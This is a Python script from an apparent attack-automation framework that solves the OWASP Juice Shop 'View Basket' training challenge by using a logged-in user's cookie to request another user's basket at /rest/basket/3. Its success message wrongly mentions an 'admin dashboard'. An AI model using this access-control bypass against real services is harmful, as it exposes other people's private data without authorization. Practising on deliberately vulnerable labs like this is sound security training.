"""
This file is used to solve the OWASP Juice-shop Task VIEW BASKET
GOAL: to view other people's basket
METHODOLOGY:
step1. login to any user that is not admin
    Hint: we can use the user created in repetitive registration
step2. view basket
"""
from plugins import attack as a
from plugins.header_config import  *
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class test_view_basket_class(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/basket/3'

    def generator(self):
        cookies = a.load_cookie()
        headers = HEADER
        return cookies, headers

    def run(self):
        cookie, header = self.generator()
        if cookie:
            response = self.juice_session.get(self.url, cookies=cookie, headers=header)
            print(response.text)
            if response.status_code == 304:
                print("successfully get admin dashboard")
                print(response.text)
            print(response.status_code)
        else:
            print("Not login yet, You need to login in with some user that is not admin. Try Repetitive Registration first.")



